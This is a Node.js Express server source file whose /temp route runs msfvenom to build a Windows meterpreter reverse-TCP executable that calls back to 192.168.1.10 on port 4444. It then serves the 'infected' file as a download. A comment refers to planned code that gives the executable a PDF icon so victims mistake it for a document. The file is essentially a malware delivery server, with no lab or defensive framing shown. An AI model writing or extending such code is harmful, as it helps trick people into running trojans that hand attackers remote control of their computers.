const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();

app.get('/',(req,res)=>{
    res.send("WORKS ..... :D")
})
app.get('/temp',(req,res)=>{
    const lhost = '192.168.1.10';
    const lport = '4444';
    const outputPath = `./payloads/payload_${Date.now()}.exe`;

    console.log("Generating payload...");

    // 1. Generate the payload
    exec(`msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} EXITFUNC=seh -f exe -o ${outputPath}`, (err) => {
        if (err) {
            return res.status(500).send("Error in the Backend");
        }

        // 2. This is where you would call the icon-changing code we discussed
        // spoofExecutable(outputPath, './assets/pdf_icon.ico');

        // 3. Send the "infected" file back to the user
        res.download(outputPath, (downloadErr) => {
            if (downloadErr) {
                console.error("Error sending file:", downloadErr);
                // Handle error during download, maybe send a 500 status
            }
            // Optional: Delete the file after it has been sent
            fs.unlink(outputPath, (unlinkErr) => {
                if (unlinkErr) {
                    console.error("Error deleting file:", unlinkErr);
                } else {
                    console.log("File deleted:", outputPath);
                }
            });
        });
    });
});

app.listen(3000,()=>{
    console.log("Server is running on port 3000")
})
